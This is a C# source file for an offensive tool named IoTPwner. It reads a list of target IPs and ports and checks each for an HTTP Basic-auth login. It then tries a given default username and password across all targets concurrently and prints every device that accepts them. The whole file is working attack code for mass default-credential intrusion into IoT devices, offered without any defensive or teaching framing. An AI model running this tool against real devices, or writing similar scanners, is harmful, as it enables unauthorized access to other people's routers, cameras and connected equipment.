using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http.Headers;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Text.Json;
using System.Buffers.Text;

namespace IoTPwner
{
    /// <summary>
    /// Performs default password attacks against IoT devices that are using the Basic authentication scheme
    /// </summary>
    public class IOTPWNER 
    {
        private HttpClient client, invalidClient; // One client is for preventing false positives during authentication.
        private StreamReader reader; // For reading each line in targets file
        
        private string creds = "";

        List<Task<int>> tasks = new List<Task<int>>();
        public IOTPWNER(string targetsPath, string username, string password)
        {
            creds = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{username}:{password}"));
            reader = getTargets(targetsPath);

            client = new HttpClient(); client.Timeout = new TimeSpan(0, 0, 5); client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", creds);
            invalidClient = new HttpClient(); invalidClient.Timeout = new TimeSpan(0, 0, 5); invalidClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", "blablablabla");

            UI.coloredOutput($"[!] Checking for combinations of \"{username}:{password}\"\n", ConsoleColor.Yellow);
        }

        private StreamReader getTargets(string targetsPath) => new StreamReader(File.OpenRead(targetsPath));

        public void start()
        {

            while (true)
            {

                string line = reader.ReadLine();
                if (line == null)
                    break;

                string ip, portsJson;
                List<string> ports;

                ip = line.Substring(0, line.IndexOf(' '));
                portsJson = line.Substring(line.IndexOf("["));
                ports = new List<string>();

                ports.AddRange(JsonSerializer.Deserialize<List<string>>(portsJson));

                tasks.Add(basicAuthentication(ip, ports));

            }

            Task.WaitAll(tasks.ToArray());
        }

        private async Task<int> basicAuthentication(string ip, List<string> ports)
        {
            // For every port which the service we want to check for default login on
 
                foreach (string port in ports)
                {
                    string uri = $"http://{ip}:{port}";

                    try
                    {
                        var response = await invalidClient.GetAsync(uri);
                        if (response.StatusCode == HttpStatusCode.Unauthorized)
                        {
                            response = await client.GetAsync(uri);
                            if (response.StatusCode == HttpStatusCode.OK)
                            {
                                UI.coloredOutput($"[+] {uri}\n", ConsoleColor.Green);
                                return 0;
                            }
                                
                        }
                    }
                    catch (Exception) { continue; }
                                 
                }
            
            return 1;     
        }

    }
}
